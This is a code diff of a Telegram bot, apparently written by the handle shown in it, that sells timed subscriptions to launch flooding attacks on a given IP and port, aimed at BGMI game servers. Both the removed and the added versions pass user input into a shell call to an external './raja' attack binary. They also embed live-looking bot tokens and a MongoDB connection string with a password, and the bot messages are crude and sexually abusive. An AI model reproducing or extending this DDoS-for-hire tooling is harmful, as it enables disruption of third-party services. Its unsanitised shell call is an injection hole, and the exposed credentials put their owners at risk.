@@ -1,327 +1,433 @@
-import asyncio
-import random
-import string
-import logging
-from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
-from pymongo import MongoClient
-from datetime import datetime, timedelta, timezone
+import telebot
+import subprocess
+import datetime
+import os
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# Insert your Telegram bot token here
+bot = telebot.TeleBot('7750901619:AAG7A-NONfK9w78Ysh2catbjnqc9efd5W44')
+# DEVELOPER --> @rajaraj_04
+# Admin user IDs
+admin_id = ["7855020275"]
 
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+# File to store allowed user IDs and their subscription expiry
+USER_FILE = "users.txt"
+SUBSCRIPTION_FILE = "subscriptions.txt"
 
-MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
-client = MongoClient(MONGO_URI)
-db = client['rabvjl']
-users_collection = db['VAMPIREXCHEATS']
-redeem_codes_collection = db['redeem_codes0']
+# File to store command logs
+LOG_FILE = "log.txt"
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# Define subscription periods in seconds
+subscription_periods = {
+    '1min': 60,
+    '1hour': 3600,
+    '6hours': 21600,
+    '12hours': 43200,
+    '1day': 86400,
+    '3days': 259200,
+    '7days': 604800,
+    '1month': 2592000,
+    '2months': 5184000
+}
 
-TELEGRAM_BOT_TOKEN = '7784344456:AAHoqGKNVyLQ3IOcvSRO1qXZnV_Wb6A4z-A'
-ADMIN_USER_ID = 7855020275 
+# Function to read user IDs from the file
+def read_users():
+    try:
+        with open(USER_FILE, "r") as file:
+            return file.read().splitlines()
+    except FileNotFoundError:
+        return []
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# Function to read subscriptions from the file
+def read_subscriptions():
+    subscriptions = {}
+    try:
+        with open(SUBSCRIPTION_FILE, "r") as file:
+            lines = file.read().splitlines()
+            for line in lines:
+                parts = line.split()
+                if len(parts) >= 2:
+                    user_id = parts[0]
+                    expiry_str = " ".join(parts[1:])
+                    try:
+                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
+                        subscriptions[user_id] = expiry
+                    except ValueError:
+                        print(f"Error parsing date for user {user_id}: {expiry_str}")
+                else:
+                    print(f"Invalid line in subscription file: {line}")
+    except FileNotFoundError:
+        pass
+    return subscriptions
 
-cooldown_dict = {}
-user_attack_history = {}
-valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')
+# Function to write subscriptions to the file
+def write_subscriptions(subscriptions):
+    with open(SUBSCRIPTION_FILE, "w") as file:
+        for user_id, expiry in subscriptions.items():
+            file.write(f"{user_id} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# List to store allowed user IDs
+allowed_user_ids = read_users()
+subscriptions = read_subscriptions()
 
-async def help_command(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        help_text = (
-            "*Here are the commands you can use:* \n\n"
-            "*💦💣 /start* - Start interacting with the bot.\n"
-            "*💦💣 /attack* - Trigger an attack operation.\n"
-            "*💦💣 /redeem* - Redeem a code.\n"
-            "*💦💣 /get_id* - Get Your Id?.\n"
-        )
-    else:
-        help_text = (
-            "*☄️ Available Commands for Admins:*\n\n"
-            "*💦💣 /start* - Start the bot.\n"
-            "*💦💣 /attack* - Start the attack.\n"
-            "*💦💣 /get_id* - Get user id.\n"
-            "*💦💣 /remove [user_id]* - Remove a user.\n"
-            "*💦💣 /users* - List all allowed users.\n"
-            "*💦💣 /gen* - Generate a redeem code.\n"
-            "*💦💣 /redeem* - Redeem a code.\n"
-        )
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')
+# Function to log command to the file
+def log_command(user_id, target, port, time):
+    user_info = bot.get_chat(user_id)
+    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
     
-async def start(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  
-    user_name = update.effective_user.first_name  
-    if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @rajaraj_04! /get_id*", parse_mode='Markdown')
-        return
-    message = (
-       "*😊🔥HELLO DEVAR JI WELCOME TO DESI HOT 🥵 BHABHI DDOS *\n\n"
-        "*💀CHODNE KE LIYE YE DBAYE /attack <ip> <port> <duration>*\n"
-        "*💦BHABHI KI CHUDAYI RAJA KREGA🫣 @rajaraj_04 🚀*" 
-    )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+    with open(LOG_FILE, "a") as file:  # Open in "append" mode
+        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
-async def remove_user(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*💪 nikal lode!*", parse_mode='Markdown')
-        return
-    if len(context.args) != 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
-        return
-    target_user_id = int(context.args[0])
-    users_collection.delete_one({"user_id": target_user_id})
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')
+# Function to clear logs
+def clear_logs():
+    try:
+        with open(LOG_FILE, "r+") as file:
+            if file.read() == "":
+                response = "Logs are already cleared. No data found."
+            else:
+                file.truncate(0)
+                response = "Logs cleared successfully."
+    except FileNotFoundError:
+        response = "No logs found to clear."
+    return response
+# RRAJARAJ_04 JOIN TO MORE UPDATES
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# Function to record command logs
+def record_command_logs(user_id, command, target=None, port=None, time=None):
+    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+    if target:
+        log_entry += f" | Target: {target}"
+    if port:
+        log_entry += f" | Port: {port}"
+    if time:
+        log_entry += f" | Time: {time}"
+    
+    with open(LOG_FILE, "a") as file:
+        file.write(log_entry + "\n")
 
-async def is_user_allowed(user_id):
-    user = users_collection.find_one({"user_id": user_id})
-    if user:
-        expiry_date = user['expiry_date']
-        if expiry_date:
-            if expiry_date.tzinfo is None:
-                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
-            if expiry_date > datetime.now(timezone.utc):
-                return True
+# Function to check if a user is subscribed
+def is_subscribed(user_id):
+    if user_id in subscriptions:
+        if datetime.datetime.now() < subscriptions[user_id]:
+            return True
+        else:
+            del subscriptions[user_id]
+            write_subscriptions(subscriptions)
     return False
 
-async def attack(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-    
-    # Check user authorization
-    if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*ruk access le phale*", parse_mode='Markdown')
-        return
-    
-    # Validate attack arguments
-    args = context.args
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*🚀 Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
-        return
-    
-    ip, port, duration = args
-    
-    # Validate IP
-    if not ip.startswith(valid_ip_prefixes):
-        await context.bot.send_message(chat_id=chat_id, text="*glt h bahen chod💦💦💦.*", parse_mode='Markdown')
-        return
-    
-    # Validate duration
-    try:
-        duration = int(duration)
-        if duration > 1200:  # New duration limit
-            response = "*ruk madharcod 300 lgale lode.*" 
-            await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown') 
-            return
-    except ValueError:
-        await context.bot.send_message(chat_id=chat_id, text="*glt ip dalta h madharcod 😡.*", parse_mode='Markdown')
-        return
-    
-    # Cooldown check
-    cooldown_period = 120
-    current_time = datetime.now()
-    if user_id in cooldown_dict:
-        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
-        if time_diff < cooldown_period:
-            remaining_time = cooldown_period - int(time_diff)
-            await context.bot.send_message(
-                chat_id=chat_id,
-                text=f"*Wait {remaining_time} seconds before next attack*",
-                parse_mode='Markdown'
-            )
-            return
-    
-    # Attack history check
-    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
-        await context.bot.send_message(chat_id=chat_id, text="*pahle hi chod diya h to baar baar kya gand dega!*", parse_mode='Markdown')
-        return
-    
-    # Update cooldown and attack history
-    cooldown_dict[user_id] = current_time
-    if user_id not in user_attack_history:
-        user_attack_history[user_id] = set()
-    user_attack_history[user_id].add((ip, port))
-    
-    # Send attack confirmation
-    await context.bot.send_message(
-        chat_id=chat_id,
-        text=(
-            f"*😧 RAJA 🥵SEVER FREEZ!❗ 💀*\n"
-        f"💦chodna shuru*!* 💦\n\n"
-        f"*🤯 flat room: {ip}:{port}*\n"
-        f"*🤣 kitne der: {duration} seconds*\n"
-        f"*🔥chudai chalu h feedback bhej dena @rajaraj_04💥*"
-    ), parse_mode='Markdown')
-
-    # Run attack asynchronously
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
-    
-async def rajaraj_04(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id 
-    message = f"YOUR USER ID: `{user_id}`" 
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
-
-async def run_attack(chat_id, ip, port, duration, context):
-    try:
-        process = await asyncio.create_subprocess_shell(
-            f"./raja {ip} {port} {duration} 800",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
-    except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
-    finally:
-        await context.bot.send_message(chat_id=chat_id, text="*😈Bas maal gir gya! 💦💦💦*\n*BGMI KO CHODNE WALE FEEDBACK DE @RAJARAJ_04!*", parse_mode='Markdown')
-
-async def generate_redeem_code(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*tere bas ki nhi h lode!*", 
-            parse_mode='Markdown'
-        )
-        return
-    if len(context.args) < 1:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
-            parse_mode='Markdown'
-        )
-        return
-    max_uses = 1
-    custom_code = None
-    time_input = context.args[0]
-    if time_input[-1].lower() in ['d', 'm']:
-        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+# Function to add or update a user's subscription
+def add_subscription(user_id, duration):
+    expiry = datetime.datetime.now() + datetime.timedelta(seconds=duration)
+    subscriptions[user_id] = expiry
+    write_subscriptions(subscriptions)
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+@bot.message_handler(commands=['add'])
+def add_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split()
+        if len(command) > 2:
+            user_to_add = command[1]
+            period = command[2]
+            if period in subscription_periods:
+                duration = subscription_periods[period]
+                if user_to_add not in allowed_user_ids:
+                    allowed_user_ids.append(user_to_add)
+                    with open(USER_FILE, "a") as file:
+                        file.write(f"{user_to_add}\n")
+                add_subscription(user_to_add, duration)
+                response = f"User {user_to_add} added with {period} subscription successfully 🎉"
+            else:
+                response = "Invalid subscription period. Use: 1min, 1hour, 6hours, 12hours, 1day, 3days, 7days, 1month, or 2months."
+        else:
+            response = "Please specify a User ID and subscription period to add."
     else:
-        custom_code = time_input
-        time_input = context.args[1] if len(context.args) > 1 else None
-        redeem_code = custom_code
-    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
-            parse_mode='Markdown'
-        )
-        return
-    if time_input[-1].lower() == 'd':  
-        time_value = int(time_input[:-1])
-        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
-        expiry_label = f"{time_value} day"
-    elif time_input[-1].lower() == 'm':  
-        time_value = int(time_input[:-1])
-        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
-        expiry_label = f"{time_value} minute"
-    if len(context.args) > (2 if custom_code else 1):
+        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
+
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['remove'])
+def remove_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split()
+        if len(command) > 1:
+            user_to_remove = command[1]
+            if user_to_remove in allowed_user_ids:
+                allowed_user_ids.remove(user_to_remove)
+                with open(USER_FILE, "w") as file:
+                    for user_id in allowed_user_ids:
+                        file.write(f"{user_id}\n")
+                if user_to_remove in subscriptions:
+                    del subscriptions[user_to_remove]
+                    write_subscriptions(subscriptions)
+                response = f"User {user_to_remove} removed successfully."
+            else:
+                response = f"User {user_to_remove} not found in the list."
+        else:
+            response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐩𝐞𝐜𝐢𝐟𝐲 𝐚 𝐔𝐬𝐞𝐫 𝐈𝐃 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞."
+    else:
+        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
+
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['clearlogs'])
+def clear_logs_command(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        response = clear_logs()
+    else:
+        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['allusers'])
+def show_all_users(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
         try:
-            max_uses = int(context.args[2] if custom_code else context.args[1])
-        except ValueError:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id, 
-                text="*⚠️ Please provide a valid number for max uses.*", 
-                parse_mode='Markdown'
-            )
-            return
-    redeem_codes_collection.insert_one({
-        "code": redeem_code,
-        "expiry_date": expiry_date,
-        "used_by": [], 
-        "max_uses": max_uses,
-        "redeem_count": 0
-    })
-    message = (
-        f"✅ Redeem code generated: `{redeem_code}`\n"
-        f"Expires in {expiry_label}\n"
-        f"Max uses: {max_uses}"
-    )
-    await context.bot.send_message(
-        chat_id=update.effective_chat.id, 
-        text=message, 
-        parse_mode='Markdown'
-    )
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                if user_ids:
+                    response = "Authorized Users:\n"
+                    for user_id in user_ids:
+                        try:
+                            user_info = bot.get_chat(int(user_id))
+                            username = user_info.username
+                            expiry = subscriptions.get(user_id, "No subscription")
+                            response += f"- @{username} (ID: {user_id}) | Expires: {expiry}\n"
+                        except Exception as e:
+                            response += f"- User ID: {user_id} | Expires: {subscriptions.get(user_id, 'No subscription')}\n"
+                else:
+                    response = "No data found."
+        except FileNotFoundError:
+            response = "No data found."
+    else:
+        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
+    bot.reply_to(message, response)
 
-async def redeem_code(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-    if len(context.args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
-        return
-    code = context.args[0]
-    redeem_entry = redeem_codes_collection.find_one({"code": code})
-    if not redeem_entry:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
-        return
-    expiry_date = redeem_entry['expiry_date']
-    if expiry_date.tzinfo is None:
-        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
-    if expiry_date <= datetime.now(timezone.utc):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
-        return
-    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
-        return
-    if user_id in redeem_entry['used_by']:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
-        return
-    users_collection.update_one(
-        {"user_id": user_id},
-        {"$set": {"expiry_date": expiry_date}},
-        upsert=True
-    )
-    redeem_codes_collection.update_one(
-        {"code": code},
-        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
-    )
-    await context.bot.send_message(chat_id=chat_id, text="*WAH 💣GAND MARNE KE LIYE !*\n*REDEEM 🫣KR LIYA✅.*", parse_mode='Markdown')
-
-async def list_users(update, context):
-    current_time = datetime.now(timezone.utc)
-    users = users_collection.find()    
-    user_list_message = "👥 User List:\n" 
-    for user in users:
-        user_id = user['user_id']
-        expiry_date = user['expiry_date']
-        if expiry_date.tzinfo is None:
-            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
-        time_remaining = expiry_date - current_time
-        if time_remaining.days < 0:
-            remaining_days = -0
-            remaining_hours = 0
-            remaining_minutes = 0
-            expired = True  
+@bot.message_handler(commands=['logs'])
+def show_recent_logs(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
+            try:
+                with open(LOG_FILE, "rb") as file:
+                    bot.send_document(message.chat.id, file)
+            except FileNotFoundError:
+                response = "No data found."
+                bot.reply_to(message, response)
         else:
-            remaining_days = time_remaining.days
-            remaining_hours = time_remaining.seconds // 3600
-            remaining_minutes = (time_remaining.seconds // 60) % 60
-            expired = False      
-        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
-        if expired:
-            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
-        else:
-            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')
+            response = "No data found."
+            bot.reply_to(message, response)
+    else:
+        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
+        bot.reply_to(message, response)
 
-def main():
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("remove", remove_user))
-    application.add_handler(CommandHandler("attack", attack))
-    application.add_handler(CommandHandler("gen", generate_redeem_code))
-    application.add_handler(CommandHandler("redeem", redeem_code))
-    application.add_handler(CommandHandler("get_id", rajaraj_04))
-    application.add_handler(CommandHandler("users", list_users))
-    application.add_handler(CommandHandler("help", help_command))
+# Function to handle the reply when free users run the /bgmi command
+def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    username = user_info.username if user_info.username else user_info.first_name
+    response = (
+        f"🎇𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱🎇\n\n"
+        f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁: `{target}`\n"
+        f"🔌 𝗣𝗼𝗿𝘁: `{port}`\n"
+        f"⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: `{time} seconds`\n"
+        f"🎮 𝗚𝗮𝗺𝗲: `𝗕𝗚𝗠𝗜`\n\n"
+        f"🚀 𝗛𝗮𝗻𝗴 𝘁𝗶𝗴𝗵𝘁! 𝗬𝗼𝘂𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...🚀\n"
+        f"🌐 𝗠𝗼𝗻𝗶𝘁𝗼𝗿𝗶𝗻𝗴 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗳𝗼𝗿 𝗼𝗽𝘁𝗶𝗺𝗮𝗹 𝗽𝗲𝗿𝗳𝗼𝗿𝗺𝗮𝗻𝗰𝗲."
+    )
     
-    application.run_polling()
-    logger.info("Bot is running.")
+    keyboard = telebot.types.InlineKeyboardMarkup()
+    keyboard.add(
+        telebot.types.InlineKeyboardButton("SUPPORT", url="https://t.me/rajaraj_04_GROUP")
+    )
+    
+    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)
 
-if __name__ == '__main__':
-    main()
+
+# Dictionary to store the last time each user ran the /bgmi command
+bgmi_cooldown = {}
+
+COOLDOWN_TIME =0
+
+# Handler for /bgmi command
+@bot.message_handler(commands=['attack'])
+def handle_bgmi(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        # Check if the user is in admin_id (admins have no cooldown)
+        if user_id not in admin_id:
+            # Check if the user has run the command before and is still within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
+                response = "⏳ 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐁𝐀𝐁𝐘 ⏳\n🔺ᗯᗩᎥ丅 0 ᗰᎥᑎᑌ丅ᗴ🔻"
+                bot.reply_to(message, response)
+                return
+            # Update the last time the user ran the command
+            bgmi_cooldown[user_id] = datetime.datetime.now()
+        
+        command = message.text.split()
+        if len(command) == 4:  # Updated to accept target, time, and port
+            target = command[1]
+            port = int(command[2])  # Convert time to integer
+            time = int(command[3])  # Convert port to integer
+            if time > 600:
+                response = "𝐓𝐈𝐌𝐄 𝐈𝐒 𝐕𝐄𝐑𝐘 𝐇𝐈𝐆𝐇 \n\n𝐓𝐑𝐘 𝐓𝐎 --> 6𝟎𝟎✅ \n𝐁𝐞𝐟𝐨𝐫𝐞 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤"
+            else:
+                record_command_logs(user_id, '/attack', target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                full_command = f"./raja {target} {port} {time} 900"
+                subprocess.run(full_command, shell=True)
+                response = f"🔺𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 𝐀𝐓𝐓𝐀𝐂𝐊🔻 \n\n💢𝗧𝗮𝗿𝗴𝗲𝘁 -> {target} \n💢𝗣𝗼𝗿𝘁: {port} \n💢𝗧𝗶𝗺𝗲: {time}"
+        else:
+            response = "💠𝐈𝐭'𝐬 𝐓𝐢𝐦𝐞 𝐓𝐨 𝐀𝐭𝐭𝐚𝐜𝐤💠 \n\n/𝐚𝐭𝐭𝐚𝐜𝐤 <𝐭𝐚𝐫𝐠𝐞𝐭> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>\n\nＲＥＡＤＹ ＦＯＲ ＳＥＸＸ"  # Updated command syntax
+    else:
+        response = "𝐔𝐧𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐓𝐨 𝐔𝐬𝐞 𝐏𝐥𝐞𝐚𝐬𝐞 𝐃𝐌 𝐭𝐨 𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑"
+
+    bot.reply_to(message, response)
+
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+
+
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+
+
+
+
+
+
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+
+
+
+
+
+
+# Add /mylogs command to display logs recorded for bgmi and website commands
+
+
+@bot.message_handler(commands=['plan'])
+def show_plan(message):
+   # response = "Our plans:\n"
+    #response += "- Basic Plan: $10/month\n"
+   # response += "- Pro Plan: $20/month\n"
+    #response += "- Premium Plan: $30/month\n"
+    response = "- 𝐃𝐌 𝐌𝐄 -- @rajaraj_04\n"
+
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['rules'])
+def show_rules(message):
+    response = "Rules:\n"
+    response += "𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐚𝐫𝐞 𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐭𝐨 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐚𝐫𝐠𝐞𝐭𝐬 𝐨𝐧𝐥𝐲.\n"
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['mylogs'])
+def show_command_logs(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids and is_subscribed(user_id):
+        try:
+            with open(LOG_FILE, "r") as file:
+                command_logs = file.readlines()
+                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
+                if user_logs:
+                    response = "Your command logs:\n" + "".join(user_logs)
+                else:
+                    response = "No command logs found for you."
+        except FileNotFoundError:
+            response = "No command logs found."
+    else:
+        response = "𝐔𝐧𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐓𝐨 𝐔𝐬𝐞 𝐏𝐥𝐞𝐚𝐬𝐞 𝐃𝐌 𝐭𝐨 𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑"
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['admincmd'])
+def show_admin_commands(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        response = "Admin commands:\n"
+        response += "/allusers - List all authorized users\n"
+        response += "/clearlogs - Clear all command logs\n"
+        response += "/remove <user_id> - Remove a user\n"
+        bot.reply_to(message, response)
+    else:
+        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
+        bot.reply_to(message, response)
+
+@bot.message_handler(commands=['id'])
+def show_user_id(message):
+    user_id = str(message.chat.id)
+    response = f"𝐘𝐨𝐮𝐫 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐃: `{user_id}`"
+    bot.reply_to(message, response, parse_mode='Markdown')
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+
+
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+
+
+@bot.message_handler(commands=['canary'])
+def show_user_id(message):
+    user_id = str(message.chat.id)
+    response = f"𝐂A𝐍𝐀𝐑𝐘 𝐀𝐏𝐊 --> https://t.me/RRAJARAJ_04/303"
+    bot.reply_to(message, response, parse_mode='Markdown')
+
+@bot.message_handler(commands=['RAJA'])
+def show_help(message):
+    response = """𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐈𝐒 --> RAJA \n𝐁𝐔𝐓 𝐇𝐈𝐒 𝐁𝐎𝐓𝐒 𝐅𝐀𝐓𝐇𝐄𝐑 @rajaraj_04 \n𝐎𝐖𝐍𝐄𝐑 𝐎𝐅 RAJA BHAI
+"""
+    keyboard = telebot.types.InlineKeyboardMarkup()
+    keyboard.row(
+        telebot.types.InlineKeyboardButton('Updates', url='https://t.me/RRAJARAJ_04'),
+        telebot.types.InlineKeyboardButton('Support', url='https://t.me/RAJARAJ_05')
+    )
+
+    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    user_name = message.from_user.first_name
+    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
+    response += '𝐓𝐡𝐢𝐬 𝐛𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐬 𝐲𝐨𝐮 𝐭𝐨 𝐩𝐞𝐫𝐟𝐨𝐫𝐦 𝐚𝐭𝐭𝐚𝐜𝐤𝐬\n\n'
+    response += '/id :--> 🅶🅴🆃 🆈🅾🆄 🆃🅴🅻🅴. 🅸🅳\n'
+    response += '/help :--> 𝐊𝐧𝐨𝐰 𝐨𝐭𝐡𝐞𝐫 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬\n'
+    response += '/attack :--> 𝐋𝐚𝐮𝐧𝐜𝐡 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤\n'
